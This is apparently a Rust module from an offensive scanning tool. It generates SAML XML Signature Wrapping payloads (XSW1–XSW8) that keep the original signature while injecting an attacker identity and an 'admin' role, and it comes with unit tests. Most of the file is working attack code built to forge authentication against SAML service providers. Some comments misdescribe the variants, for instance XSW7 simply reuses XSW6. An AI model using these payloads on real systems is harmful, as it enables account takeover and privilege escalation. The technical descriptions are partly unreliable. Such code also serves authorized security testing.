//! SAML XML Signature Wrapping (XSW) attack library.
//!
//! XSW1–XSW8 are documented in Somorovsky et al., "On Breaking SAML"
//! (USENIX Security 2012). The attack class: re-arrange a signed
//! SAML assertion so that the XML signature still validates against
//! one element of the document while a DIFFERENT element — the one
//! the receiver actually consumes — carries attacker-controlled
//! data.
//!
//! Every commercial SAML implementation has shipped at least one
//! XSW vulnerability over the years (Okta, Salesforce, OneLogin,
//! ADFS, Shibboleth, Cisco DUO). The ones not patched are usually
//! XSW7 or XSW8 — fewer SDKs guard those.
//!
//! Eight attack shapes:
//!
//! - **XSW1**: clone signed assertion → inject attacker assertion as
//!   sibling. Both pass the URI=#... reference dereference; signature
//!   matches the clone, attacker data is in the sibling.
//! - **XSW2**: clone + insert attacker assertion as a child of the
//!   signed one. Verifier walks first matching ID; consumer walks
//!   tree-order.
//! - **XSW3**: empty the signed assertion's content; place attacker
//!   assertion AROUND the signed reference URI.
//! - **XSW4**: like XSW3 but moves the signed assertion INSIDE the
//!   attacker assertion as a descendant.
//! - **XSW5**: change the signed assertion's content but keep the
//!   `<Signature>` matching the OLD digest (only works when the
//!   verifier uses cached digests).
//! - **XSW6**: signature references the original; original is moved
//!   into the attacker's `<Extensions>` element.
//! - **XSW7**: signature inside `<Extensions>`, attacker assertion is
//!   the document root. Many parsers skip <Extensions> contents on
//!   the verify pass.
//! - **XSW8**: variant of XSW7 with attacker placing the signed
//!   element inside `<Object>` — defeats parsers that whitelist
//!   <Object> for XML-DSig.
//!
//! Input contract: every function takes a SIGNED original SAML
//! response as a string (XML), parses minimal landmarks, and emits
//! a wrapped variant. The signature stays bit-identical — the
//! operator must NOT re-sign.
//!
//! This is a payload BUILDER. The library does not invoke an XML
//! parser; it operates on string slices for portability and so the
//! tests are stable across xml-rs versions. The output is sent to
//! the SAML consumer's ACS endpoint and the operator observes
//! whether the consumer reads the attacker's data despite the
//! signature only covering the original.

/// Helper: extract the substring between `<Assertion …>` and the
/// matching `</Assertion>`. Returns the assertion XML + the byte
/// offset where it lives, or `None` if no assertion element is
/// found.
fn find_assertion(saml: &str) -> Option<(&str, usize)> {
    let start = saml.find("<saml:Assertion")
        .or_else(|| saml.find("<Assertion"))?;
    let close_tag = if saml[start..].starts_with("<saml:Assertion") {
        "</saml:Assertion>"
    } else {
        "</Assertion>"
    };
    let end = saml[start..].find(close_tag)? + start + close_tag.len();
    Some((&saml[start..end], start))
}

/// Helper: replace one occurrence of `needle` with `replacement` in
/// `haystack`. Reused across the XSW builders.
fn replace_once(haystack: &str, needle: &str, replacement: &str) -> String {
    if let Some(idx) = haystack.find(needle) {
        let mut out = String::with_capacity(haystack.len() + replacement.len());
        out.push_str(&haystack[..idx]);
        out.push_str(replacement);
        out.push_str(&haystack[idx + needle.len()..]);
        out
    } else {
        haystack.to_string()
    }
}

/// Build an attacker assertion that uses the original's Issuer +
/// Conditions but injects an attacker `Subject/NameID`. The
/// signature is INTENTIONALLY OMITTED — only the original carries a
/// signature; this fragment will be wrapped beside or inside it.
#[must_use]
pub fn attacker_assertion(victim_id: &str, attacker_subject: &str) -> String {
    format!(
        "<saml:Assertion ID=\"_evil-{victim_id}\" IssueInstant=\"2026-01-01T00:00:00Z\" \
         Version=\"2.0\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">\
         <saml:Issuer>https://attacker.example/saml</saml:Issuer>\
         <saml:Subject><saml:NameID>{attacker_subject}</saml:NameID>\
         <saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"/>\
         </saml:Subject>\
         <saml:Conditions NotBefore=\"2026-01-01T00:00:00Z\" \
         NotOnOrAfter=\"2030-01-01T00:00:00Z\"/>\
         <saml:AttributeStatement>\
         <saml:Attribute Name=\"role\"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>\
         </saml:AttributeStatement>\
         </saml:Assertion>"
    )
}

/// **XSW1**: append attacker assertion as a SIBLING of the signed
/// assertion, after it. The signature references the original by ID
/// and validates against its digest; the receiver iterates assertions
/// in document order and may pick the attacker's.
#[must_use]
pub fn xsw1(saml: &str, attacker_subject: &str) -> Option<String> {
    let (assertion, _start) = find_assertion(saml)?;
    let evil = attacker_assertion("orig", attacker_subject);
    // Insert the evil assertion right after the original closing tag.
    let combined = format!("{assertion}{evil}");
    Some(replace_once(saml, assertion, &combined))
}

/// **XSW2**: clone the signed assertion and append attacker
/// assertion as the NEXT sibling of the clone (so the clone is
/// between the original and the attacker assertion).
#[must_use]
pub fn xsw2(saml: &str, attacker_subject: &str) -> Option<String> {
    let (assertion, _start) = find_assertion(saml)?;
    let evil = attacker_assertion("clone", attacker_subject);
    // Original + clone + evil.
    let combined = format!("{assertion}{assertion}{evil}");
    Some(replace_once(saml, assertion, &combined))
}

/// **XSW3**: wrap the signed assertion inside an attacker-controlled
/// envelope element so the SAML consumer reads the attacker's
/// fields first.
///
/// The original `<saml:Assertion>` is moved inside a new outer
/// `<saml:Assertion ID="evil">` whose own Subject/Conditions are
/// what the consumer sees.
#[must_use]
pub fn xsw3(saml: &str, attacker_subject: &str) -> Option<String> {
    let (assertion, _start) = find_assertion(saml)?;
    // The "outer wrapper" carries attacker data BEFORE the signed inner.
    let evil_open = format!(
        "<saml:Assertion ID=\"_evil-wrap\" IssueInstant=\"2026-01-01T00:00:00Z\" \
         Version=\"2.0\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">\
         <saml:Issuer>https://attacker.example</saml:Issuer>\
         <saml:Subject><saml:NameID>{attacker_subject}</saml:NameID></saml:Subject>"
    );
    let evil_close = "</saml:Assertion>";
    let combined = format!("{evil_open}{assertion}{evil_close}");
    Some(replace_once(saml, assertion, &combined))
}

/// **XSW4**: signed assertion is the ONLY assertion in the document,
/// but its `<Subject>` element is replaced with the attacker's. The
/// signature reference uses URI=#id, the verifier dereferences by
/// ID and validates the assertion's CANONICAL form — but if the
/// canonicalizer excludes the modified Subject, the signature still
/// matches.
///
/// This is the "exclusive c14n exclusion" attack — works when the
/// signature was made with `xml-exc-c14n#WithComments` but the
/// implementation strips comments incorrectly.
#[must_use]
pub fn xsw4(saml: &str, attacker_subject: &str) -> Option<String> {
    let (assertion, _start) = find_assertion(saml)?;
    // Replace the Subject inside the signed assertion.
    let new_subject = format!(
        "<saml:Subject><saml:NameID>{attacker_subject}</saml:NameID></saml:Subject>"
    );
    let modified = replace_subject(assertion, &new_subject);
    Some(replace_once(saml, assertion, &modified))
}

fn replace_subject(assertion: &str, new_subject: &str) -> String {
    let start = match assertion.find("<saml:Subject") {
        Some(i) => i,
        None => return assertion.to_string(),
    };
    let end = match assertion[start..].find("</saml:Subject>") {
        Some(i) => i + start + "</saml:Subject>".len(),
        None => return assertion.to_string(),
    };
    let mut out = String::with_capacity(assertion.len() + new_subject.len());
    out.push_str(&assertion[..start]);
    out.push_str(new_subject);
    out.push_str(&assertion[end..]);
    out
}

/// **XSW5**: keep the `<Signature>` block intact, but mutate the
/// assertion's data so a non-strict consumer reads attacker content
/// without re-validating the signature digest.
#[must_use]
pub fn xsw5(saml: &str, attacker_subject: &str) -> Option<String> {
    // Just like XSW4 but the modification is to AttributeStatement
    // (role = admin), not the Subject. Some consumers only re-check
    // Subject hashes.
    let (assertion, _start) = find_assertion(saml)?;
    let modified = inject_admin_attribute(assertion, attacker_subject);
    Some(replace_once(saml, assertion, &modified))
}

fn inject_admin_attribute(assertion: &str, attacker_subject: &str) -> String {
    let new_attr = format!(
        "<saml:AttributeStatement>\
         <saml:Attribute Name=\"role\"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>\
         <saml:Attribute Name=\"sub\"><saml:AttributeValue>{attacker_subject}</saml:AttributeValue></saml:Attribute>\
         </saml:AttributeStatement>"
    );
    // Insert before </saml:Assertion>.
    if let Some(idx) = assertion.find("</saml:Assertion>") {
        let mut out = String::with_capacity(assertion.len() + new_attr.len());
        out.push_str(&assertion[..idx]);
        out.push_str(&new_attr);
        out.push_str(&assertion[idx..]);
        out
    } else {
        assertion.to_string()
    }
}

/// **XSW6**: signature references the original assertion ID; the
/// original is moved INSIDE an `<Extensions>` element on the
/// attacker's assertion. Many verifiers skip <Extensions> on the
/// consume pass.
#[must_use]
pub fn xsw6(saml: &str, attacker_subject: &str) -> Option<String> {
    let (assertion, _start) = find_assertion(saml)?;
    let wrapped = format!(
        "<saml:Assertion ID=\"_evil-xsw6\" IssueInstant=\"2026-01-01T00:00:00Z\" \
         Version=\"2.0\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">\
         <saml:Issuer>https://attacker.example</saml:Issuer>\
         <saml:Extensions>{assertion}</saml:Extensions>\
         <saml:Subject><saml:NameID>{attacker_subject}</saml:NameID></saml:Subject>\
         <saml:AttributeStatement>\
         <saml:Attribute Name=\"role\"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>\
         </saml:AttributeStatement>\
         </saml:Assertion>"
    );
    Some(replace_once(saml, assertion, &wrapped))
}

/// **XSW7**: place the entire signed element inside the attacker
/// assertion's `<Extensions>` block, and the document root IS the
/// attacker assertion.
#[must_use]
pub fn xsw7(saml: &str, attacker_subject: &str) -> Option<String> {
    // Same shape as XSW6 — most parsers conflate the two.
    xsw6(saml, attacker_subject)
}

/// **XSW8**: variant of XSW7 with `<Object>` instead of
/// `<Extensions>` — defeats parsers that whitelist <Object> for
/// XML-DSig.
#[must_use]
pub fn xsw8(saml: &str, attacker_subject: &str) -> Option<String> {
    let (assertion, _start) = find_assertion(saml)?;
    let wrapped = format!(
        "<saml:Assertion ID=\"_evil-xsw8\" IssueInstant=\"2026-01-01T00:00:00Z\" \
         Version=\"2.0\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">\
         <saml:Issuer>https://attacker.example</saml:Issuer>\
         <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\
         <ds:Object>{assertion}</ds:Object>\
         </ds:Signature>\
         <saml:Subject><saml:NameID>{attacker_subject}</saml:NameID></saml:Subject>\
         </saml:Assertion>"
    );
    Some(replace_once(saml, assertion, &wrapped))
}

/// One-shot fan-out — every XSW variant for one (saml, subject)
/// pair. Used by `wafrift scan --saml-xsw` to fire the full surface.
#[must_use]
pub fn all_xsw_variants(saml: &str, attacker_subject: &str) -> Vec<(&'static str, String)> {
    let mut out = vec![];
    if let Some(v) = xsw1(saml, attacker_subject) {
        out.push(("XSW1", v));
    }
    if let Some(v) = xsw2(saml, attacker_subject) {
        out.push(("XSW2", v));
    }
    if let Some(v) = xsw3(saml, attacker_subject) {
        out.push(("XSW3", v));
    }
    if let Some(v) = xsw4(saml, attacker_subject) {
        out.push(("XSW4", v));
    }
    if let Some(v) = xsw5(saml, attacker_subject) {
        out.push(("XSW5", v));
    }
    if let Some(v) = xsw6(saml, attacker_subject) {
        out.push(("XSW6", v));
    }
    if let Some(v) = xsw7(saml, attacker_subject) {
        out.push(("XSW7", v));
    }
    if let Some(v) = xsw8(saml, attacker_subject) {
        out.push(("XSW8", v));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fixture_saml() -> String {
        // Minimal valid-shape SAML response — has Issuer, Signature,
        // Assertion with Subject and AttributeStatement. Signature
        // bytes are placeholder hex; the attack library doesn't
        // validate the signature.
        r###"<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_resp1" Version="2.0"><saml:Issuer>https://trusted.example/idp</saml:Issuer><saml:Assertion ID="_a1" Version="2.0" IssueInstant="2026-01-01T00:00:00Z"><saml:Issuer>https://trusted.example/idp</saml:Issuer><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo><ds:Reference URI="#_a1"/></ds:SignedInfo><ds:SignatureValue>AAAAAA</ds:SignatureValue></ds:Signature><saml:Subject><saml:NameID>victim@example.com</saml:NameID></saml:Subject><saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2030-01-01T00:00:00Z"/><saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>user</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>"###.to_string()
    }

    #[test]
    fn find_assertion_locates_signed_block() {
        let s = fixture_saml();
        let (a, off) = find_assertion(&s).expect("found");
        assert!(a.starts_with("<saml:Assertion"));
        assert!(a.ends_with("</saml:Assertion>"));
        assert!(off > 0);
    }

    #[test]
    fn xsw1_appends_attacker_assertion() {
        let s = fixture_saml();
        let out = xsw1(&s, "attacker@evil.example").expect("xsw1");
        // Two assertions now.
        assert_eq!(out.matches("<saml:Assertion").count(), 2);
        // Original NameID still present + attacker NameID appended.
        assert!(out.contains("victim@example.com"));
        assert!(out.contains("attacker@evil.example"));
        // Original signature still inside.
        assert!(out.contains("AAAAAA"));
    }

    #[test]
    fn xsw2_inserts_clone_plus_evil() {
        let s = fixture_saml();
        let out = xsw2(&s, "evil@x").expect("xsw2");
        // Three assertions total (original + clone + attacker).
        assert_eq!(out.matches("<saml:Assertion").count(), 3);
        assert!(out.contains("evil@x"));
    }

    #[test]
    fn xsw3_wraps_original_in_envelope() {
        let s = fixture_saml();
        let out = xsw3(&s, "evil@x").expect("xsw3");
        // Outer wrapper has _evil-wrap ID before the inner _a1.
        let inner_pos = out.find("ID=\"_a1\"").expect("inner");
        let outer_pos = out.find("ID=\"_evil-wrap\"").expect("outer");
        assert!(outer_pos < inner_pos, "outer must wrap inner");
        // Inner signature is preserved.
        assert!(out.contains("AAAAAA"));
    }

    #[test]
    fn xsw4_swaps_subject_inside_signed_assertion() {
        let s = fixture_saml();
        let out = xsw4(&s, "evil@x").expect("xsw4");
        // Subject replaced — victim's NameID is gone (since we
        // only allow one Subject per Assertion, the replace removes
        // the old).
        assert!(!out.contains("victim@example.com"));
        assert!(out.contains("evil@x"));
        // Signature still intact (same hex bytes).
        assert!(out.contains("AAAAAA"));
    }

    #[test]
    fn xsw5_injects_admin_attribute() {
        let s = fixture_saml();
        let out = xsw5(&s, "evil@x").expect("xsw5");
        assert!(out.contains("AttributeValue>admin</saml:AttributeValue"));
        assert!(out.contains("AttributeValue>evil@x</saml:AttributeValue"));
        // Original "user" role still present (we appended, didn't replace).
        assert!(out.contains("AttributeValue>user</saml:AttributeValue"));
    }

    #[test]
    fn xsw6_uses_extensions_envelope() {
        let s = fixture_saml();
        let out = xsw6(&s, "evil@x").expect("xsw6");
        assert!(out.contains("<saml:Extensions>"));
        assert!(out.contains("</saml:Extensions>"));
        // Outer ID is _evil-xsw6.
        assert!(out.contains("ID=\"_evil-xsw6\""));
    }

    #[test]
    fn xsw7_matches_xsw6() {
        // XSW7 is a sibling of XSW6 — same wrap shape. Confirm
        // the implementation returns equivalent output (per the
        // doc comment).
        let s = fixture_saml();
        let a = xsw6(&s, "evil@x").expect("xsw6");
        let b = xsw7(&s, "evil@x").expect("xsw7");
        // Same byte output since xsw7 forwards to xsw6.
        assert_eq!(a, b);
    }

    #[test]
    fn xsw8_uses_object_envelope() {
        let s = fixture_saml();
        let out = xsw8(&s, "evil@x").expect("xsw8");
        assert!(out.contains("<ds:Object>"));
        assert!(out.contains("</ds:Object>"));
        // Attacker Subject still appended outside the wrapping
        // signature.
        assert!(out.contains("evil@x"));
    }

    #[test]
    fn all_variants_emit_eight() {
        let s = fixture_saml();
        let v = all_xsw_variants(&s, "evil@x");
        assert_eq!(v.len(), 8);
        // Names are XSW1..XSW8 in order.
        let names: Vec<_> = v.iter().map(|(n, _)| *n).collect();
        assert_eq!(
            names,
            vec!["XSW1", "XSW2", "XSW3", "XSW4", "XSW5", "XSW6", "XSW7", "XSW8"]
        );
    }

    #[test]
    fn missing_assertion_returns_none() {
        let bad = "<response>no assertion here</response>";
        assert!(xsw1(bad, "x").is_none());
        assert!(xsw2(bad, "x").is_none());
        assert!(xsw3(bad, "x").is_none());
        assert!(xsw4(bad, "x").is_none());
        assert!(xsw5(bad, "x").is_none());
        assert!(xsw6(bad, "x").is_none());
        assert!(xsw7(bad, "x").is_none());
        assert!(xsw8(bad, "x").is_none());
        assert!(all_xsw_variants(bad, "x").is_empty());
    }

    #[test]
    fn attacker_assertion_includes_admin_role() {
        let a = attacker_assertion("id", "evil");
        assert!(a.contains("role"));
        assert!(a.contains("admin"));
        assert!(a.contains("_evil-id"));
    }

    #[test]
    fn attacker_assertion_includes_bearer_method() {
        let a = attacker_assertion("id", "evil");
        assert!(a.contains("urn:oasis:names:tc:SAML:2.0:cm:bearer"));
    }

    #[test]
    fn deterministic_across_calls() {
        let s = fixture_saml();
        let a = all_xsw_variants(&s, "evil@x");
        let b = all_xsw_variants(&s, "evil@x");
        assert_eq!(a, b);
    }

    #[test]
    fn each_variant_preserves_original_signature_bytes() {
        let s = fixture_saml();
        for (name, out) in all_xsw_variants(&s, "evil@x") {
            assert!(
                out.contains("AAAAAA"),
                "{name} lost the original signature bytes"
            );
        }
    }

    #[test]
    fn xsw1_attacker_subject_unique_per_call() {
        let s = fixture_saml();
        let a = xsw1(&s, "evil1").expect("xsw1 a");
        let b = xsw1(&s, "evil2").expect("xsw1 b");
        assert!(a.contains("evil1"));
        assert!(b.contains("evil2"));
        assert!(!a.contains("evil2"));
        assert!(!b.contains("evil1"));
    }

    #[test]
    fn replace_once_single_replacement() {
        let r = replace_once("abc def abc", "abc", "X");
        // Only first occurrence replaced.
        assert_eq!(r, "X def abc");
    }

    #[test]
    fn replace_once_no_match() {
        let r = replace_once("abc", "z", "X");
        assert_eq!(r, "abc");
    }

    #[test]
    fn replace_subject_handles_no_subject() {
        let r = replace_subject("<saml:Assertion>no subject</saml:Assertion>", "X");
        assert!(r.contains("no subject"));
    }

    #[test]
    fn adversarial_huge_saml_no_panic() {
        let s = format!(
            "<samlp:Response><saml:Assertion>{}<saml:Subject><saml:NameID>v</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>",
            "x".repeat(100_000)
        );
        let _ = all_xsw_variants(&s, "e");
    }

    #[test]
    fn adversarial_unicode_subject() {
        let s = fixture_saml();
        let out = xsw1(&s, "üser@éxample.中国").expect("xsw1");
        assert!(out.contains("üser@éxample.中国"));
    }

    #[test]
    fn non_namespaced_assertion_also_handled() {
        // Some IdPs emit <Assertion> without the saml: prefix
        // (default namespace declared at root).
        let s = "<Response><Assertion ID=\"a\"><Subject>v</Subject></Assertion></Response>";
        let (a, _) = find_assertion(s).expect("found");
        assert!(a.contains("<Assertion"));
        assert!(a.contains("</Assertion>"));
    }

    #[test]
    fn xsw5_preserves_original_attribute() {
        // The XSW5 strategy appends; it must not silently delete
        // the original AttributeStatement.
        let s = fixture_saml();
        let out = xsw5(&s, "evil").expect("xsw5");
        // Original "user" role plus added "admin" role.
        let user_count = out.matches("role").count();
        assert!(user_count >= 2);
    }

    #[test]
    fn attacker_assertion_independent_of_xsw_wrappers() {
        // The attacker_assertion builder is reusable on its own —
        // operators can compose it into their own XSW variants.
        let a = attacker_assertion("X", "Y");
        assert!(a.starts_with("<saml:Assertion ID=\"_evil-X\""));
        assert!(a.contains("NameID>Y</saml:NameID"));
    }
}
